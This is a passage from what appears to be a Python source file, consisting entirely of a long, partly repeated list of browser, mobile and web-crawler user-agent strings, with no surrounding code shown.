               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
